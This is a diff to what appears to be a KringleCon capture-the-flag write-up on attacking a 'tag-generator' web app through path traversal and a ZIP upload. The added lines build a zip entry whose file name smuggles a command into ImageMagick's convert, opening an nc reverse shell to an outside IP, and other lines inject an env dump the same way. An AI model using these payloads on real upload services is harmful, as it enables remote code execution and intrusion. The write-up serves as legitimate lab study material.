@@ -33,6 +33,10 @@ curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app
 This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
 Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
 ```
+touch joergen.jpg
+zip joergen.zip joergen.jpg
+printf "@ joergen.jpg\n@=\';nc 93.211.52.129 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip
+
 jsw@io:*$ touch \'\`env\>joergen\`\;\'.jpg
 jsw@io:*$ zip joergen.zip \'\`env\>joergen\`\;\'.jpg
   adding: '`env>joergen`;'.jpg (stored 0%)
@@ -76,10 +80,10 @@ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTgyMzA1MDg2MSwxMjkzNzIwNDM5LDEzOT
-U3OTQ4MjQsLTE1OTkyNTQ0MTUsLTYxOTI5NzQxMSwtNTc2NjEw
-MDc1LDIxMDc1Mjk4NDYsOTIyMTQ0MzUsLTM5ODQ5MTQ2MSwxMT
-UxNTU2ODk2LDIzODQ2MDI3MiwxOTMzMzYxNzg3LC0xNDY3NjE1
-MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4NjUsLT
-E2MDYwNzgwNDBdfQ==
+eyJoaXN0b3J5IjpbMjEwNTc3NjA3NiwtODIzMDUwODYxLDEyOT
+M3MjA0MzksMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3
+NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMz
+k4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3
+ODcsLTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLD
+kyMDQ1NTg2NSwtMTYwNjA3ODA0MF19
 -->
